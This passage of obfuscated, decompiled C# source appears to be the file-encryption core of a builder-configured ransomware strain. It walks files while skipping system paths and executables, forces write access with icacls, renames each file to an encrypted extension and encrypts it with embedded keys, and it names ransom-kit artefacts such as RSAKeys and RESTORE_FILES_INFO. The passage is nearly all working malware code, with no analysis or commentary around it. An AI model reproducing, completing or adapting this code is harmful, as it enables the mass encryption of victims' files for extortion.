!bKleOnnwOsJw.ldrdWbhdALtRA.Contains("ntuser.dat") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("NTUSER.DAT") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("iconcache.db") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("bootsect.bak") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("boot.ini") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("ntuser.dat.log") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("thumbs.db") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("bootmgr") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("pagefile.sys") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("config.sys") && !bKleOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("ntuser.ini") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("Builder_Log") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("RSAKeys") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("Config.enc") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("RESTORE_FILES_INFO") && !bKleOnnwOsJw.ldrdWbhdALtRA.EndsWith(this.f00003e) && !bKleOnnwOsJw.ldrdWbhdALtRA.EndsWith("exe") && !bKleOnnwOsJw.ldrdWbhdALtRA.EndsWith("dll") && !bKleOnnwOsJw.ldrdWbhdALtRA.EndsWith("EXE") && !bKleOnnwOsJw.ldrdWbhdALtRA.EndsWith("DLL") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains("Recycle.Bin") && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains(GhAMvbuoccW.RoiBxbbYOpTnzdF) && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains(GhAMvbuoccW.f000025) && !bKleOnnwOsJw.ldrdWbhdALtRA.Contains(GhAMvbuoccW.muQSQoYNOwJp))
          {
            if (this.nBTsxqqCcIrA.Length != 0)
            {
              foreach (string str2 in this.nBTsxqqCcIrA)
              {
                if (bKleOnnwOsJw.ldrdWbhdALtRA.EndsWith(str2))
                  goto label_101;
              }
            }
            try
            {
              if (bKleOnnwOsJw.ldrdWbhdALtRA.EndsWith(this.f00003e))
                goto label_101;
            }
            catch (Exception ex)
            {
              goto label_101;
            }
            if (bKleOnnwOsJw.ldrdWbhdALtRA.EndsWith(p0) && !GhAMvbuoccW.f000006.Contains(bKleOnnwOsJw.ldrdWbhdALtRA))
            {
              if (GhAMvbuoccW.BBqvZtJMKtZyzF == "YES")
              {
                try
                {
                  if (uruahRFIszrntX.bURwEzWcMZKaoi(bKleOnnwOsJw.ldrdWbhdALtRA))
                    uruahRFIszrntX.BBxxokkeNIlNHfR(bKleOnnwOsJw.ldrdWbhdALtRA);
                }
                catch (Exception ex)
                {
                }
              }
              GhAMvbuoccW.f000006.Add(bKleOnnwOsJw.ldrdWbhdALtRA);
              if (start1 == null)
                start1 = new ThreadStart(bKleOnnwOsJw.m000019);
              new Thread(start1)
              {
                Priority = ThreadPriority.Normal,
                IsBackground = true
              }.Start();
              if (!GhAMvbuoccW.HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(bKleOnnwOsJw.ldrdWbhdALtRA)))
                GhAMvbuoccW.HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(bKleOnnwOsJw.ldrdWbhdALtRA));
              GhAMvbuoccW.m000008(bKleOnnwOsJw.ldrdWbhdALtRA);
              try
              {
                new SnjLOUpfRioti().fwTUnyzIwakYqxR(bKleOnnwOsJw.ldrdWbhdALtRA);
              }
              catch (Exception ex)
              {
              }
              try
              {
                using (FileStream fileStream = new FileStream(bKleOnnwOsJw.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write))
                {
                  if (!fileStream.CanWrite)
                    GhAMvbuoccW.m000002("icacls.exe", "\"" + bKleOnnwOsJw.ldrdWbhdALtRA + "\"" + " /grant " + "\"" + Environment.UserName + "\"" + ":F /T /C /Q");
                }
              }
              catch (Exception ex1)
              {
                if (GhAMvbuoccW.CCDyMIHlAe)
                {
                  try
                  {
                    System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + bKleOnnwOsJw.ldrdWbhdALtRA + " - Error while checking for user write access permission: " + ex1.Message + "\r\n");
                    continue;
                  }
                  catch (Exception ex2)
                  {
                    continue;
                  }
                }
                else
                  continue;
              }
              try
              {
                try
                {
                  if (new FileInfo(bKleOnnwOsJw.ldrdWbhdALtRA).Length == 0L)
                    continue;
                }
                catch (Exception ex3)
                {
                  if (GhAMvbuoccW.CCDyMIHlAe)
                  {
                    try
                    {
                      System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + bKleOnnwOsJw.ldrdWbhdALtRA + " - Error while reading if filesize is zero: " + ex3.Message + "\r\n");
                    }
                    catch (Exception ex4)
                    {
                    }
                  }
                  ++GhAMvbuoccW.f00002a;
                  continue;
                }
                if (GhAMvbuoccW.f00000f == "YES" && new FileInfo(bKleOnnwOsJw.ldrdWbhdALtRA).Length > (long) (Convert.ToInt32(GhAMvbuoccW.f000010) * 1024 * 1024) && !this.MWjzSWdUTiapH.Contains(p0))
                {
                  ThreadStart start2 = (ThreadStart) null;
                  GhAMvbuoccW.mDsrdwsfBAgqx.c00000a c00000a = new GhAMvbuoccW.mDsrdwsfBAgqx.c00000a();
                  c00000a.SnSgbcozGOnPa = bKleOnnwOsJw;
                  c00000a.irnVJvnuIedJmu = this;
                  try
                  {
                    if (this.f00003e != ".*")
                    {
                      if (GhAMvbuoccW.YazilaoopZ)
                        this.f00003e = GhAMvbuoccW.f00002c + this.f00003e;
                      System.IO.File.Move(bKleOnnwOsJw.ldrdWbhdALtRA, bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e);
                    }
                  }
                  catch (Exception ex5)
                  {
                    if (GhAMvbuoccW.CCDyMIHlAe)
                    {
                      try
                      {
                        System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + bKleOnnwOsJw.ldrdWbhdALtRA + " - Error while renaming to crypted extension: " + ex5.Message + "\r\n");
                      }
                      catch (Exception ex6)
                      {
                      }
                    }
                    ++GhAMvbuoccW.f00002a;
                    continue;
                  }
                  c00000a.f000041 = "";
                  c00000a.f000041 = !(this.f00003e != ".*") ? bKleOnnwOsJw.ldrdWbhdALtRA : bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e;
                  if (GhAMvbuoccW.f000012 == "YES")
                  {
                    if (start2 == null)
                      start2 = new ThreadStart(c00000a.m00001a);
                    new Thread(start2)
                    {
                      Priority = ThreadPriority.Normal,
                      IsBackground = false
                    }.Start();
                  }
                  byte[] bytes = Encoding.ASCII.GetBytes(GhAMvbuoccW.EXVykcHaTCNay);
                  if (GhAMvbuoccW.nqNdPWHffReq == "NO")
                  {
                    byte[] p0_1 = c000018.KQanXSigbuDh(c00000a.f000041, Convert.ToInt32(GhAMvbuoccW.f000010) * 1024 * 1024);
                    byte[] p1;
                    if (!GhAMvbuoccW.uBIPmjbCjNt)
                    {
                      if (!GhAMvbuoccW.PAOJgADrbjEa)
                        p1 = c000018.SvtZMRYDytMixf(p0_1, Convert.FromBase64String(this.f000002), new byte[8]
                        {
                          (byte) 1,
                          (byte) 2,
                          (byte) 3,
                          (byte) 4,
                          (byte) 5,
                          (byte) 6,
                          (byte) 7,
                          (byte) 8
                        });
                      else
                        p1 = c000018.SvtZMRYDytMixf(p0_1, Convert.FromBase64String(this.f000002), new byte[8]
                        {
                          (byte) 1,
                          (byte) 2,
                          (byte) 3,
                          (byte) 4,
                          (byte) 5,
                          (byte) 6,
                          (byte) 7,
                          (byte) 8
                        });
                    }
                    else
                      p1 = GhAMvbuoccW.PAOJgADrbjEa ? sAdFSOOagDt.m00002a(p0_1, Convert.FromBase64String(this.f000002), Convert.FromBase64String(GhAMvbuoccW.f000003)) : sAdFSOOagDt.m00002a(p0_1, Convert.FromBase64String(this.f000002), Convert.FromBase64String(GhAMvbuoccW.f000003));
                    if (!c000018.EHTmbBVFpgxa(c00000a.f000041, p1, bytes))
                    {
                      try
                      {
                        System.IO.File.Move(bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e, bKleOnnwOsJw.ldrdWbhdALtRA);
                        continue;
                      }
                      catch (Exception ex)
                      {
                        continue;
                      }
                    }
                  }
                  else if (!GhAMvbuoccW.PAOJgADrbjEa)
                  {
                    if (!GeksFIyCuYbq.uVsAlcvYzOr(c00000a.f000041, GhAMvbuoccW.f000010, this.f000002, p4: Convert.FromBase64String(GhAMvbuoccW.f000003)))
                    {
                      try
                      {
                        System.IO.File.Move(bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e, bKleOnnwOsJw.ldrdWbhdALtRA);
                        continue;
                      }
                      catch (Exception ex)
                      {
                        continue;
                      }
                    }
                  }
                  else if (!GeksFIyCuYbq.uVsAlcvYzOr(c00000a.f000041, GhAMvbuoccW.f000010, this.f000002, bytes, Convert.FromBase64String(GhAMvbuoccW.f000003)))
                  {
                    try
                    {
                      System.IO.File.Move(bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e, bKleOnnwOsJw.ldrdWbhdALtRA);
                      continue;
                    }
                    catch (Exception ex)
                    {
                      continue;
                    }
                  }
                }
                else
                {
                  if (GhAMvbuoccW.YazilaoopZ)
                    this.f00003e = GhAMvbuoccW.f00002c + this.f00003e;
                  byte[] bytes = Encoding.ASCII.GetBytes(GhAMvbuoccW.EXVykcHaTCNay);
                  if (!(this.f00003e != ".*"))
                  {
                    if (!GhAMvbuoccW.UOlZmEwYRBbnfmvt)
                    {
                      if (GhAMvbuoccW.PAOJgADrbjEa)
                        GhAMvbuoccW.fsRkhosBCvdFpjZ(bKleOnnwOsJw.ldrdWbhdALtRA, bKleOnnwOsJw.ldrdWbhdALtRA + ".part", Convert.FromBase64String(this.f000002));
                      else
                        GhAMvbuoccW.fsRkhosBCvdFpjZ(bKleOnnwOsJw.ldrdWbhdALtRA, bKleOnnwOsJw.ldrdWbhdALtRA + ".part", GhAMvbuoccW.bGfpmpYMCsNkyjcK);
                    }
                    else
                    {
                      try
                      {
                        if (!GhAMvbuoccW.PAOJgADrbjEa)
                          GhAMvbuoccW.m00000b(bKleOnnwOsJw.ldrdWbhdALtRA, bKleOnnwOsJw.ldrdWbhdALtRA, GhAMvbuoccW.bGfpmpYMCsNkyjcK, Convert.FromBase64String(GhAMvbuoccW.f000003));
                        else
                          GhAMvbuoccW.m00000b(bKleOnnwOsJw.ldrdWbhdALtRA, bKleOnnwOsJw.ldrdWbhdALtRA, Convert.FromBase64String(this.f000002), Convert.FromBase64String(GhAMvbuoccW.f000003));
                      }
                      catch (Exception ex7)
                      {
                        if (GhAMvbuoccW.CCDyMIHlAe)
                        {
                          try
                          {
                            System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + bKleOnnwOsJw.ldrdWbhdALtRA + " - Error while fully writing to file: " + ex7.Message + "\r\n");
                          }
                          catch (Exception ex8)
                          {
                          }
                        }
                        ++GhAMvbuoccW.f00002a;
                        continue;
                      }
                    }
                  }
                  else if (!GhAMvbuoccW.UOlZmEwYRBbnfmvt)
                  {
                    if (GhAMvbuoccW.PAOJgADrbjEa)
                      GhAMvbuoccW.fsRkhosBCvdFpjZ(bKleOnnwOsJw.ldrdWbhdALtRA, bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e, Convert.FromBase64String(this.f000002));
                    else
                      GhAMvbuoccW.fsRkhosBCvdFpjZ(bKleOnnwOsJw.ldrdWbhdALtRA, bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e, GhAMvbuoccW.bGfpmpYMCsNkyjcK);
                  }
                  else
                  {
                    try
                    {
                      if (!GhAMvbuoccW.PAOJgADrbjEa)
                        GhAMvbuoccW.m00000b(bKleOnnwOsJw.ldrdWbhdALtRA, bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e, GhAMvbuoccW.bGfpmpYMCsNkyjcK, Convert.FromBase64String(GhAMvbuoccW.f000003));
                      else
                        GhAMvbuoccW.m00000b(bKleOnnwOsJw.ldrdWbhdALtRA, bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e, Convert.FromBase64String(this.f000002), Convert.FromBase64String(GhAMvbuoccW.f000003));
                    }
                    catch (Exception ex9)
                    {
                      if (GhAMvbuoccW.CCDyMIHlAe)
                      {
                        try
                        {
                          System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + bKleOnnwOsJw.ldrdWbhdALtRA + " - Error while fully writing to file: " + ex9.Message + "\r\n");
                        }
                        catch (Exception ex10)
                        {
                        }
                      }
                      ++GhAMvbuoccW.f00002a;
                      try
                      {
                        System.IO.File.Move(bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e, bKleOnnwOsJw.ldrdWbhdALtRA);
                        continue;
                      }
                      catch (Exception ex11)
                      {
                        continue;
                      }
                    }
                  }
                  if (GhAMvbuoccW.PAOJgADrbjEa)
                  {
                    if (this.f00003e != ".*")
                      GhAMvbuoccW.m000006(bKleOnnwOsJw.ldrdWbhdALtRA + this.f00003e, bytes);
                    else
                      GhAMvbuoccW.m000006(bKleOnnwOsJw.ldrdWbhdALtRA, bytes);
                  }
                }
              }
              catch (Exception ex)
              {
              }
            }
            else
              continue;
label_101:
            this.vJUzSMoRbycwzG.Remove(bKleOnnwOsJw.ldrdWbhdALtRA);
          }
        }
      }

      public void m000018(string p0)
      {
        ThreadStart start = (ThreadStart) null;
        GhAMvbuoccW.mDsrdwsfBAgqx.c00000b c00000b = new GhAMvbuoccW.mDsrdwsfBAgqx.c00000b();
        c00000b.irnVJvnuIedJmu = this;
        c00000b.ldrdWbhdALtRA = p0;
        if ((!c00000b.ldrdWbhdALtRA.Contains("C:\\Program Files\\") && !c00000b.ldrdWbhdALtRA.Contains("C:\\Program Files (x86)\\") && !c00000b.ldrdWbhdALtRA.Contains(":\\Windows\\") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("perflogs") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("internet explorer") && !c00000b.ldrdWbhdALtRA.Contains(":\\ProgramData\\") && !c00000b.ldrdWbhdALtRA.Contains("\\AppData\\") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("msocache") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("system volume information") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("boot") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("tor browser") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("mozilla") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("google chrome") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("application data") || c00000b.ldrdWbhdALtRA.Contains("Microsoft SQL Server")) && !c00000b.ldrdWbhdALtRA.Contains("autoexec.bat") && !c00000b.ldrdWbhdALtRA.Contains("desktop.ini") && !c00000b.ldrdWbhdALtRA.Contains("autorun.inf") && !c00000b.ldrdWbhdALtRA.Contains("ntuser.dat") && !c00000b.ldrdWbhdALtRA.Contains("NTUSER.DAT") && !c00000b.ldrdWbhdALtRA.Contains("iconcache.db") && !c00000b.ldrdWbhdALtRA.Contains("bootsect.bak") && !c00000b.ldrdWbhdALtRA.Contains("boot.ini") && !c00000b.ldrdWbhdALtRA.Contains("ntuser.dat.log") && !c00000b.ldrdWbhdALtRA.Contains("thumbs.db") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("bootmgr") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("pagefile.sys") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("config.sys") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("ntuser.ini") && !c00000b.ldrdWbhdALtRA.Contains("Builder_Log") && !c00000b.ldrdWbhdALtRA.Contains("RSAKeys") && !c00000b.ldrdWbhdALtRA.Contains("Config.enc") && !c00000b.ldrdWbhdALtRA.Contains("RESTORE_FILES_INFO") && !c00000b.ldrdWbhdALtRA.EndsWith(this.f00003e) && !c00000b.ldrdWbhdALtRA.EndsWith("exe") && !c00000b.ldrdWbhdALtRA.EndsWith("dll") && !c00000b.ldrdWbhdALtRA.EndsWith("EXE") && !c00000b.ldrdWbhdALtRA.EndsWith("DLL") && !c00000b.ldrdWbhdALtRA.Contains("Recycle.Bin") && !c00000b.ldrdWbhdALtRA.Contains(GhAMvbuoccW.RoiBxbbYOpTnzdF) && !c00000b.ldrdWbhdALtRA.Contains(GhAMvbuoccW.f000025) && !c00000b.ldrdWbhdALtRA.Contains(GhAMvbuoccW.muQSQoYNOwJp))
        {
          if (this.nBTsxqqCcIrA.Length != 0)
          {
            foreach (string str in this.nBTsxqqCcIrA)
            {
              if (c00000b.ldrdWbhdALtRA.EndsWith(str))
                goto label_100;
            }
          }
          try
          {
            if (c00000b.ldrdWbhdALtRA.EndsWith(this.f00003e))
              goto label_100;
          }
          catch (Exception ex)
          {
            goto label_100;
          }
          if (!GhAMvbuoccW.f000006.Contains(c00000b.ldrdWbhdALtRA))
          {
            if (GhAMvbuoccW.BBqvZtJMKtZyzF == "YES")
            {
              try
              {
                if (uruahRFIszrntX.bURwEzWcMZKaoi(c00000b.ldrdWbhdALtRA))
                  uruahRFIszrntX.BBxxokkeNIlNHfR(c00000b.ldrdWbhdALtRA);
              }
              catch (Exception ex)
              {
              }
            }
            GhAMvbuoccW.f000006.Add(c00000b.ldrdWbhdALtRA);
            new Thread(new ThreadStart(c00000b.m00001b))
            {
              Priority = ThreadPriority.Normal,
              IsBackground = true
            }.Start();
            if (!GhAMvbuoccW.HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(c00000b.ldrdWbhdALtRA)))
              GhAMvbuoccW.HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(c00000b.ldrdWbhdALtRA));
            GhAMvbuoccW.m000008(c00000b.ldrdWbhdALtRA);
            try
            {
              new SnjLOUpfRioti().fwTUnyzIwakYqxR(c00000b.ldrdWbhdALtRA);
            }
            catch (Exception ex)
            {
            }
            try
            {
              using (FileStream fileStream = new FileStream(c00000b.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write))
              {
                if (!fileStream.CanWrite)
                  GhAMvbuoccW.m000002("icacls.exe", "\"" + c00000b.ldrdWbhdALtRA + "\"" + " /grant " + "\"" + Environment.UserName + "\"" + ":F /T /C /Q");
              }
            }
            catch (Exception ex1)
            {
              if (!GhAMvbuoccW.CCDyMIHlAe)
                return;
              try
              {
                System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + c00000b.ldrdWbhdALtRA + " - Error while checking for user write access permission: " + ex1.Message + "\r\n");
                return;
              }
              catch (Exception ex2)
              {
                return;
              }
            }
            try
            {
              try
              {
                if (new FileInfo(c00000b.ldrdWbhdALtRA).Length == 0L)
                  goto label_100;
              }
              catch (Exception ex3)
              {
                if (GhAMvbuoccW.CCDyMIHlAe)
                {
                  try
                  {
                    System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + c00000b.ldrdWbhdALtRA + " - Error while reading if filesize is zero: " + ex3.Message + "\r\n");
                  }
                  catch (Exception ex4)
                  {
                  }
                }
                ++GhAMvbuoccW.f00002a;
                goto label_100;
              }
              if (GhAMvbuoccW.f00000f == "YES")
              {
                if (new FileInfo(c00000b.ldrdWbhdALtRA).Length > (long) (Convert.ToInt32(GhAMvbuoccW.f000010) * 1024 * 1024))
                {
                  try
                  {
                    if (this.f00003e != ".*")
                    {
                      if (GhAMvbuoccW.YazilaoopZ)
                        this.f00003e = GhAMvbuoccW.f00002c + this.f00003e;
                      System.IO.File.Move(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + this.f00003e);
                    }
                  }
                  catch (Exception ex5)
                  {
                    if (GhAMvbuoccW.CCDyMIHlAe)
                    {
                      try
                      {
                        System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + c00000b.ldrdWbhdALtRA + " - Error while renaming to crypted extension: " + ex5.Message + "\r\n");
                      }
                      catch (Exception ex6)
                      {
                      }
                    }
                    ++GhAMvbuoccW.f00002a;
                    return;
                  }
                  if (this.f00003e != ".*")
                    c00000b.ldrdWbhdALtRA += this.f00003e;
                  if (GhAMvbuoccW.f000012 == "YES")
                  {
                    if (start == null)
                      start = new ThreadStart(c00000b.m00001c);
                    new Thread(start)
                    {
                      IsBackground = false,
                      Priority = ThreadPriority.Normal
                    }.Start();
                  }
                  byte[] bytes = Encoding.ASCII.GetBytes(GhAMvbuoccW.EXVykcHaTCNay);
                  if (GhAMvbuoccW.nqNdPWHffReq == "NO")
                  {
                    byte[] p0_1 = c000018.KQanXSigbuDh(c00000b.ldrdWbhdALtRA, Convert.ToInt32(GhAMvbuoccW.f000010) * 1024 * 1024);
                    byte[] p1;
                    if (!GhAMvbuoccW.uBIPmjbCjNt)
                    {
                      if (!GhAMvbuoccW.PAOJgADrbjEa)
                        p1 = c000018.SvtZMRYDytMixf(p0_1, Convert.FromBase64String(this.f000002), new byte[8]
                        {
                          (byte) 1,
                          (byte) 2,
                          (byte) 3,
                          (byte) 4,
                          (byte) 5,
                          (byte) 6,
                          (byte) 7,
                          (byte) 8
                        });
                      else
                        p1 = c000018.SvtZMRYDytMixf(p0_1, Convert.FromBase64String(this.f000002), new byte[8]
                        {
                          (byte) 1,
                          (byte) 2,
                          (byte) 3,
                          (byte) 4,
                          (byte) 5,
                          (byte) 6,
                          (byte) 7,
                          (byte) 8
                        });
                    }
                    else
                      p1 = GhAMvbuoccW.PAOJgADrbjEa ? sAdFSOOagDt.m00002a(p0_1, Convert.FromBase64String(this.f000002), Convert.FromBase64String(GhAMvbuoccW.f000003)) : sAdFSOOagDt.m00002a(p0_1, Convert.FromBase64String(this.f000002), Convert.FromBase64String(GhAMvbuoccW.f000003));
                    if (!c000018.EHTmbBVFpgxa(c00000b.ldrdWbhdALtRA, p1, bytes))
                    {
                      try
                      {
                        System.IO.File.Move(c00000b.ldrdWbhdALtRA + this.f00003e, c00000b.ldrdWbhdALtRA);
                        return;
                      }
                      catch (Exception ex)
                      {
                        return;
                      }
                    }
                    else
                      goto label_100;
                  }
                  else if (!GhAMvbuoccW.PAOJgADrbjEa)
                  {
                    if (!GeksFIyCuYbq.uVsAlcvYzOr(c00000b.ldrdWbhdALtRA, GhAMvbuoccW.f000010, this.f000002, p4: Convert.FromBase64String(GhAMvbuoccW.f000003)))
                    {
                      try
                      {
                        System.IO.File.Move(c00000b.ldrdWbhdALtRA + this.f00003e, c00000b.ldrdWbhdALtRA);
                        return;
                      }
                      catch (Exception ex)
                      {
                        return;
                      }
                    }
                    else
                      goto label_100;
                  }
                  else if (!GeksFIyCuYbq.uVsAlcvYzOr(c00000b.ldrdWbhdALtRA, GhAMvbuoccW.f000010, this.f000002, bytes, Convert.FromBase64String(GhAMvbuoccW.f000003)))
                  {
                    try
                    {
                      System.IO.File.Move(c00000b.ldrdWbhdALtRA + this.f00003e, c00000b.ldrdWbhdALtRA);
                      return;
                    }
                    catch (Exception ex)
                    {
                      return;
                    }
                  }
                  else
                    goto label_100;
                }
              }
              if (GhAMvbuoccW.YazilaoopZ)
                this.f00003e = GhAMvbuoccW.f00002c + this.f00003e;
              byte[] bytes1 = Encoding.ASCII.GetBytes(GhAMvbuoccW.EXVykcHaTCNay);
              if (!(this.f00003e != ".*"))
              {
                if (!GhAMvbuoccW.UOlZmEwYRBbnfmvt)
                {
                  if (GhAMvbuoccW.PAOJgADrbjEa)
                    GhAMvbuoccW.fsRkhosBCvdFpjZ(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + ".part", Convert.FromBase64String(this.f000002));
                  else
                    GhAMvbuoccW.fsRkhosBCvdFpjZ(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + ".part", GhAMvbuoccW.bGfpmpYMCsNkyjcK);
                }
                else
                {
                  try
                  {
                    if (!GhAMvbuoccW.PAOJgADrbjEa)
                      GhAMvbuoccW.m00000b(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA, GhAMvbuoccW.bGfpmpYMCsNkyjcK, Convert.FromBase64String(GhAMvbuoccW.f000003));
                    else
                      GhAMvbuoccW.m00000b(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA, Convert.FromBase64String(this.f000002), Convert.FromBase64String(GhAMvbuoccW.f000003));
                  }
                  catch (Exception ex7)
                  {
                    if (GhAMvbuoccW.CCDyMIHlAe)
                    {
                      try
                      {
                        System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + c00000b.ldrdWbhdALtRA + " - Error while fully writing to file: " + ex7.Message + "\r\n");
                      }
                      catch (Exception ex8)
                      {
                      }
                    }
                    ++GhAMvbuoccW.f00002a;
                    return;
                  }
                }
              }
              else if (!GhAMvbuoccW.UOlZmEwYRBbnfmvt)
              {
                if (GhAMvbuoccW.PAOJgADrbjEa)
                  GhAMvbuoccW.fsRkhosBCvdFpjZ(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + this.f00003e, Convert.FromBase64String(this.f000002));
                else
                  GhAMvbuoccW.fsRkhosBCvdFpjZ(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + this.f00003e, GhAMvbuoccW.bGfpmpYMCsNkyjcK);
              }
              else
              {
                try
                {
                  if (!GhAMvbuoccW.PAOJgADrbjEa)
                    GhAMvbuoccW.m00000b(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + this.f00003e, GhAMvbuoccW.bGfpmpYMCsNkyjcK, Convert.FromBase64String(GhAMvbuoccW.f000003));
                  else
                    GhAMvbuoccW.m00000b(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + this.f00003e, Convert.FromBase64String(this.f000002), Convert.FromBase64String(GhAMvbuoccW.f000003));
                }
                catch (Exception ex9)
                {
                  if (GhAMvbuoccW.CCDyMIHlAe)
                  {
                    try
                    {
                      System.IO.File.AppendAllText(GhAMvbuoccW.f000025, "File: " + c00000b.ldrdWbhdALtRA + " - Error while fully writing to file: " + ex9.Message + "\r\n");
                    }
                    catch (Exception ex10)
                    {
                    }
                  }
                  ++GhAMvbuoccW.f00002a;
                  try
                  {
                    System.IO.File.Move(c00000b.ldrdWbhdALtRA + this.f00003e, c00000b.ldrdWbhdALtRA);
                    return;
                  }
                  catch (Exception ex11)
                  {
                    return;
                  }
                }
              }
              if (GhAMvbuoccW.PAOJgADrbjEa)
              {
                if (this.f00003e != ".*")
                  GhAMvbuoccW.m000006(c00000b.ldrdWbhdALtRA + this.f00003e, bytes1);
                else
                  GhAMvbuoccW.m000006(c00000b.ldrdWbhdALtRA, bytes1);
              }
            }
            catch (Exception ex)
            {
            }
          }
        }
label_100:
        this.vJUzSMoRbycwzG.Remove(c00000b.ldrdWbhdALtRA);
      }

      static mDsrdwsfBAgqx() => SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (GhAMvbuoccW.mDsrdwsfBAgqx));

      private sealed class bKLeOnnwOsJw
      {
        public GhAMvbuoccW.mDsrdwsfBAgqx irnVJvnuIedJmu;
        public string ldrdWbhdALtRA;
        [NonSerialized]
        internal static GetString f000040;

        public void m000019()
        {
        }

        static bKLeOnnwOsJw() => SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (GhAMvbuoccW.mDsrdwsfBAgqx.bKLeOnnwOsJw));
      }

      private sealed class c00000a
      {
        public GhAMvbuoccW.mDsrdwsfBAgqx.bKLeOnnwOsJw SnSgbcozGOnPa;
        public GhAMvbuoccW.mDsrdwsfBAgqx irnVJvnuIedJmu;
        public string f000041;
        [NonSerialized]
        internal static GetString f000042;

        public void m00001a()
        {
          foreach (string str in GhAMvbuoccW.f000013)
          {
            if (this.f000041.ToLower().EndsWith(str + this.irnVJvnuIedJmu.f00003e) && GhAMvbuoccW.f000014 == "YES")
            {
              if ((long) (Convert.ToInt32(GhAMvbuoccW.f000015) * 1024 * 1024) > new FileInfo(this.f000041).Length)
              {
                try
                {
                  c000013.ybntlhJHhisLb(p3: this.f000041);
                }
                catch (Exception ex)
                {
                }
              }
            }
            else if (this.f000041.ToLower().EndsWith(str))
            {
              if (GhAMvbuoccW.f000014 == "NO")
              {
                try
                {
                  c000013.ybntlhJHhisLb(p3: this.f000041);
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
        }

        static c00000a() => SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (GhAMvbuoccW.mDsrdwsfBAgqx.c00000a));
      }

      private sealed class c00000b
      {
        public GhAMvbuoccW.mDsrdwsfBAgqx irnVJvnuIedJmu;
        public string ldrdWbhdALtRA;
        [NonSerialized]
        internal static GetString f000043;

        public void m00001b()
        {
        }

        public void m00001c()
        {
          foreach (string str in GhAMvbuoccW.f000013)
          {
            if (this.ldrdWbhdALtRA.ToLower().EndsWith(str + this.irnVJvnuIedJmu.f00003e) && GhAMvbuoccW.f000014 == "YES")
            {
              if ((long) (Convert.ToInt32(GhAMvbuoccW.f000015) * 1024 * 1024) > new FileInfo(this.ldrdWbhdALtRA).Length)
              {
                try
                {
                  c000013.ybntlhJHhisLb(p3: this.ldrdWbhdALtRA);
                }
                catch (Exception ex)
                {
                }
              }
            }
            else if (this.ldrdWbhdALtRA.ToLower().EndsWith(str))
            {
              if (GhAMvbuoccW.f000014 == "NO")
              {
                try
                {
                  c000013.ybntlhJHhisLb(p3: this.ldrdWbhdALtRA);
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
        }

        static c00000b() => SmartAssembly.HouseOfCards.Strings.CreateGetStringDelegate(typeof (GhAMvbuoccW.mDsrdwsfBAgqx.c00000b));
      }
    }

    private sealed class cTttKVwFNmpq
    {
      public string f000044;
      public string eedfnXcwSQkQNFbIx;

      public void m00001d()
      {
        while (true)
        {
          try
          {
